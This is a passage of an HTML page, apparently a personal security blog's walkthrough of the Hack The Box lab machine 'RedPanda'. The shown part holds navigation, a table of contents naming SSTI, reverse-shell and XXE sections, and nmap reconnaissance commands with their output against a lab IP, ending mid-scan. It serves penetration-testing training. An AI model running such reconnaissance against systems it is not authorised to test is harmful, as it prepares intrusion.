@@ -1,0 +1,3596 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <meta name="generator" content="Hugo 0.140.2">
+
+    <script src="js/custom.js"></script>
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Bones &amp; All Cyber Security" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
+        
+
+        
+            <meta name="author" content="bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            RedPanda HTB Walkthrough |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
+                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
+                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
+                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            RedPanda HTB Walkthrough -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/sau-box/" title="./walkthroughs/sau-box/">
+                        
+                            Sau HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/love-box/" title="./walkthroughs/love-box/">
+                        
+                            Love HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/editorial-box/" title="./walkthroughs/editorial-box/">
+                        
+                            Editorial HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/doctor-box/" title="./walkthroughs/doctor-box/">
+                        
+                            Doctor HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/forest-box/" title="./walkthroughs/forest-box/">
+                        
+                            Forest HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/driver-box/" title="./walkthroughs/driver-box/">
+                        
+                            Driver HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/timelapse-box/" title="./walkthroughs/timelapse-box/">
+                        
+                            Timelapse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/certified-box/" title="./walkthroughs/certified-box/">
+                        
+                            Certified HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/aero-box/" title="./walkthroughs/aero-box/">
+                        
+                            Aero HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/administrator-box/" title="./walkthroughs/administrator-box/">
+                        
+                            Administrator HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/sauna-box/" title="./walkthroughs/sauna-box/">
+                        
+                            Sauna HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/active-box/" title="./walkthroughs/active-box/">
+                        
+                            Active HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cicada-box/" title="./walkthroughs/cicada-box/">
+                        
+                            Cicada HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/authority-box/" title="./walkthroughs/authority-box/">
+                        
+                            Authority HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/evilcups-box/" title="./walkthroughs/evilcups-box/">
+                        
+                            EvilCUPS HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/resolute-box/" title="./walkthroughs/resolute-box/">
+                        
+                            Resolute HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
+                        
+                            Fuse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
+                        
+                            Cascade HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
+                        
+                            Monteverde HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
+                        
+                            Outdated HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
+                        
+                            Scrambled HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
+                        
+                            Escape HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
+                        
+                            Hospital HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Articles </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingasreproasting/" title="./articles/understandingasreproasting/">
+                        
+                            Understanding AS-REP Roasting Attacks: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingdownloadcradles/" title="./articles/understandingdownloadcradles/">
+                        
+                            Understanding PowerShell Download Cradles: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understanding2023-28252-clfs/" title="./articles/understanding2023-28252-clfs/">
+                        
+                            Understanding CVE-2023-28252: Deep Dive into the CLFS Privilege Escalation Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingthemebleedcve-2023-38146/" title="./articles/understandingthemebleedcve-2023-38146/">
+                        
+                            Understanding CVE-2023-38146: Deep Dive into the ThemeBleed Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingcupsexploitation/" title="./articles/understandingcupsexploitation/">
+                        
+                            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingnopacexploit/" title="./articles/understandingnopacexploit/">
+                        
+                            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
+                        
+                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
+                        
+                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
+                        
+                            Understanding the Shadow Credentials Attack Vector
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
+                        
+                            Understanding .NET Deserialization Exploits: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Tools </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
+                        
+                            LDAPire: LDAP Enumeration Tool
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/automatingqemukalivm/" title="./tools/automatingqemukalivm/">
+                        
+                            Automating Kali VM Setup with QEMU
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
+                        
+                            BloodServer: A Secure File Transfer Tool for Penetration Testers
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Cheatsheets </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
+                        
+                            Attacking LDAP: Deep Dive &amp; Cheatsheet
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
+                        
+                            Attacking RPC: Deep Dive &amp; Cheat Sheet
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/redpanda-box/" title="./redpanda-box/">
+                        
+                            RedPanda HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                RedPanda HTB Walkthrough
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="2025.12.01"
+                            >2025.12.01
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        23 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+                <div class="tags">
+                    <i
+                        class="bi bi-tags"
+                        title="Tags"></i>
+                    
+                        <a
+                            href="/tags/box/"
+                            class="tag-btn">
+                            Box
+                        </a>
+                    
+                        <a
+                            href="/tags/htb/"
+                            class="tag-btn">
+                            HTB
+                        </a>
+                    
+                        <a
+                            href="/tags/easy/"
+                            class="tag-btn">
+                            Easy
+                        </a>
+                    
+                        <a
+                            href="/tags/linux/"
+                            class="tag-btn">
+                            Linux
+                        </a>
+                    
+                        <a
+                            href="/tags/ssti/"
+                            class="tag-btn">
+                            SSTI
+                        </a>
+                    
+                        <a
+                            href="/tags/java/"
+                            class="tag-btn">
+                            Java
+                        </a>
+                    
+                        <a
+                            href="/tags/spring/"
+                            class="tag-btn">
+                            Spring
+                        </a>
+                    
+                        <a
+                            href="/tags/web/"
+                            class="tag-btn">
+                            Web
+                        </a>
+                    
+                        <a
+                            href="/tags/cron/"
+                            class="tag-btn">
+                            Cron
+                        </a>
+                    
+                        <a
+                            href="/tags/xxe/"
+                            class="tag-btn">
+                            XXE
+                        </a>
+                    
+                </div>
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/redpanda-box/" class="bread-btn">
+    
+
+    
+        
+            RedPanda HTB Walkthrough
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#redpanda-hack-the-box-walkthrough-writeup">RedPanda Hack The Box Walkthrough/Writeup:</a></li>
+    <li><a href="#how-i-use-variables-and-wordlists">How I Use Variables &amp; Wordlists:</a></li>
+    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
+      <ul>
+        <li><a href="#nmap">NMAP:</a></li>
+        <li><a href="#ssh-22">SSH <code>22</code>:</a></li>
+        <li><a href="#http-proxy-8080">HTTP-Proxy <code>8080</code>:</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-dot-foothold">2. Foothold:</a>
+      <ul>
+        <li><a href="#getting-rce-on-the-host-via-ssti">Getting RCE On The Host VIA SSTI:</a></li>
+        <li><a href="#getting-a-reverse-shell-via-ssti">Getting A Reverse Shell VIA SSTI:</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-dot-enumerating-as-woodenk">3. Enumerating As woodenk:</a>
+      <ul>
+        <li><a href="#enumerating-as-woodenk">Enumerating As woodenk:</a></li>
+        <li><a href="#finding-hard-coded-credentials">Finding Hard Coded Credentials:</a></li>
+        <li><a href="#accessing-the-host-via-ssh">Accessing The Host Via SSH:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-dot-privilege-escalation">4. Privilege Escalation:</a>
+      <ul>
+        <li><a href="#manual-privilege-escalation-checks">Manual Privilege Escalation Checks:</a></li>
+        <li><a href="#checking-running-processes-with-pspy-and-finding-a-cron-job-running-as-root">Checking Running Processes With <a href="https://github.com/DominicBreuker/pspy">pspy</a> &amp; Finding A Cron Job Running As Root:</a></li>
+        <li><a href="#reading-the-source-code-of-app-dot-java">Reading The Source Code Of <code>app.java</code>:</a></li>
+        <li><a href="#code-break-down">Code Break-Down:</a></li>
+        <li><a href="#why-the-code-is-vulnerable">Why The Code Is Vulnerable:</a></li>
+        <li><a href="#xxe-primer-what-is-xml-external-entity-processing">XXE Primer: What is XML External Entity Processing?</a></li>
+        <li><a href="#exploitation">Exploitation:</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-dot-persistence">5. Persistence:</a></li>
+    <li><a href="#lessons-learned">Lessons Learned:</a>
+      <ul>
+        <li><a href="#what-did-i-learn">What did I learn?</a></li>
+        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
+      </ul>
+    </li>
+    <li><a href="#sign-off">Sign off:</a></li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="redpanda-hack-the-box-walkthrough-writeup">RedPanda Hack The Box Walkthrough/Writeup:</h2>
+<ul>
+<li><a href="https://app.hackthebox.com/machines/RedPanda">https://app.hackthebox.com/machines/RedPanda</a></li>
+</ul>
+<h2 id="how-i-use-variables-and-wordlists">How I Use Variables &amp; Wordlists:</h2>
+<ul>
+<li>
+<p><strong>Variables</strong>:</p>
+<ul>
+<li>In my commands you are going to see me use <code>$box</code>, <code>$user</code>, <code>$hash</code>, <code>$domain</code>, <code>$pass</code> often.
+<ul>
+<li>I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
+<ul>
+<li><code>$box</code> = The IP of the box</li>
+<li><code>$pass</code> = Passwords I have access to.</li>
+<li><code>$user</code> = current user I am enumerating with.
+<ul>
+<li>Depending on where I am in the process this can change if I move laterally.</li>
+</ul>
+</li>
+<li><code>$domain</code> = the domain name e.g. <code>sugarape.local</code> or <code>contoso.local</code></li>
+<li><code>$machine</code> = the machine name e.g. <code>DC01</code></li>
+</ul>
+</li>
+<li>Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Wordlists</strong>:</p>
+<ul>
+<li>I have symlinks all setup so I can get to my passwords from <code>~/Wordlists</code> so if you see me using that path that&rsquo;s why. If you are on Kali and following on, you will need to go to <code>/usr/share/wordlists</code>
+<ul>
+<li>I also use these additional wordlists:
+<ul>
+<li><a href="https://github.com/insidetrust/statistically-likely-usernames">Statistically-likely-usernames</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
+<li><a href="https://github.com/carlospolop/Auto_Wordlists">Auto_Wordlists</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-dot-enumeration">1. Enumeration:</h2>
+<h3 id="nmap">NMAP:</h3>
+<h4 id="basic-scans">Basic Scans:</h4>
+<ul>
+<li><strong>Basic TCP Scan</strong>:
+<ul>
+<li><code>nmap $box -Pn -oA TCPbasicScan</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="Kali%20in%20HTB/BlogEntriesMade/RedPanda/scans/nmap%20%20%f0%9f%8d%a3%20main%20%203GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2015:17:33%20zsh%20%e2%9d%af%20nmap%20$box%20-oA%20TCPbasicScan%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-12-27%2015:17%20GMT%0aNmap%20scan%20report%20for%2010.129.227.207%0aHost%20is%20up%20%280.039s%20latency%29.%0aNot%20shown:%20998%20closed%20tcp%20ports%20%28reset%29%0aPORT%20%20%20%20%20STATE%20SERVICE%0a22/tcp%20%20%20open%20%20ssh%0a8080/tcp%20open%20%20http-proxy%0a%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%200.92%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Kali in HTB/BlogEntriesMade/RedPanda/scans/nmap  🍣 main  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 15:17:33 zsh ❯ nmap $box -oA TCPbasicScan
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-12-27 15:17 GMT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.207
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>8080/tcp open  http-proxy
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.92 seconds</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><strong>Initial thoughts</strong>:
+<ul>
+<li>SSH &amp; Some sort of proxy. SSH is slow and long to bruteforce so the proxy will most likely be the entry-point.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="comprehensive-scans">Comprehensive Scans:</h4>
+<ul>
+<li><strong>In depth scan TCP</strong>:
+<ul>
+<li><code>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20kali%20in%20HTB/BlogEntriesMade/RedPanda/scans/nmap%20%20%f0%9f%8d%a3%20main%20%203GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%20%20%f0%9f%95%99%2015:19:23%20zsh%20%e2%9d%af%20sudo%20nmap%20-p-%20-sV%20-sC%20-O%20--disable-arp-ping%20$box%20-oA%20FullTCP%0a%20%20[sudo]%20password%20for%20kali:%0a%20%20Starting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-12-27%2015:19%20GMT%0a%20%20Nmap%20scan%20report%20for%2010.129.227.207%0a%20%20Host%20is%20up%20%280.038s%20latency%29.%0a%20%20Not%20shown:%2065451%20closed%20tcp%20ports%20%28reset%29,%2082%20filtered%20tcp%20ports%20%28no-response%29%0a%20%20PORT%20%20%20%20%20STATE%20SERVICE%20%20%20%20VERSION%0a%20%2022/tcp%20%20%20open%20%20ssh%20%20%20%20%20%20%20%20OpenSSH%208.2p1%20Ubuntu%204ubuntu0.5%20%28Ubuntu%20Linux;%20protocol%202.0%29%0a%20%20%7c%20ssh-hostkey:%0a%20%20%7c%20%20%203072%2048:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae%20%28RSA%29%0a%20%20%7c%20%20%20256%20b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f%20%28ECDSA%29%0a%20%20%7c_%20%20256%2018:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb%20%28ED25519%29%0a%20%208080/tcp%20open%20%20http-proxy%0a%20%20%7c_http-title:%20Red%20Panda%20Search%20%7c%20Made%20with%20Spring%20Boot%0a%20%20%7c_http-open-proxy:%20Proxy%20might%20be%20redirecting%20requests%0a%20%20%7c%20fingerprint-strings:%0a%20%20%7c%20%20%20GetRequest:%0a%20%20%7c%20%20%20%20%20HTTP/1.1%20200%0a%20%20%7c%20%20%20%20%20Content-Type:%20text/html;charset=UTF-8%0a%20%20%7c%20%20%20%20%20Content-Language:%20en-US%0a%20%20%7c%20%20%20%20%20Date:%20Fri,%2027%20Dec%202024%2015:20:47%20GMT%0a%20%20%7c%20%20%20%20%20Connection:%20close%0a%20%20%7c%20%20%20%20%20%3c!DOCTYPE%20html%3e%0a%20%20%7c%20%20%20%20%20%3chtml%20lang=%22en%22%20dir=%22ltr%22%3e%0a%20%20%7c%20%20%20%20%20%3chead%3e%0a%20%20%7c%20%20%20%20%20%3cmeta%20charset=%22utf-8%22%3e%0a%20%20%7c%20%20%20%20%20%3cmeta%20author=%22wooden_k%22%3e%0a%20%20%7c%20%20%20%20%20%3c!--Codepen%20by%20khr2003:%20https://codepen.io/khr2003/pen/BGZdXw%20--%3e%0a%20%20%7c%20%20%20%20%20%3clink%20rel=%22stylesheet%22%20href=%22css/panda.css%22%20type=%22text/css%22%3e%0a%20%20%7c%20%20%20%20%20%3clink%20rel=%22stylesheet%22%20href=%22css/main.css%22%20type=%22text/css%22%3e%0a%20%20%7c%20%20%20%20%20%3ctitle%3eRed%20Panda%20Search%20%7c%20Made%20with%20Spring%20Boot%3c/title%3e%0a%20%20%7c%20%20%20%20%20%3c/head%3e%0a%20%20%7c%20%20%20%20%20%3cbody%3e%0a%20%20%7c%20%20%20%20%20%3cdiv%20class=%27pande%27%3e%0a%20%20%7c%20%20%20%20%20%3cdiv%20class=%27ear%20left%27%3e%3c/div%3e%0a%20%20%7c%20%20%20%20%20%3cdiv%20class=%27ear%20right%27%3e%3c/div%3e%0a%20%20%7c%20%20%20%20%20%3cdiv%20class=%27whiskers%20left%27%3e%0a%20%20%7c%20%20%20%20%20%3cspan%3e%3c/span%3e%0a%20%20%7c%20%20%20%20%20%3cspan%3e%3c/span%3e%0a%20%20%7c%20%20%20%20%20%3cspan%3e%3c/span%3e%0a%20%20%7c%20%20%20%20%20%3c/div%3e%0a%20%20%7c%20%20%20%20%20%3cdiv%20class=%27whiskers%20right%27%3e%0a%20%20%7c%20%20%20%20%20%3cspan%3e%3c/span%3e%0a%20%20%7c%20%20%20%20%20%3cspan%3e%3c/span%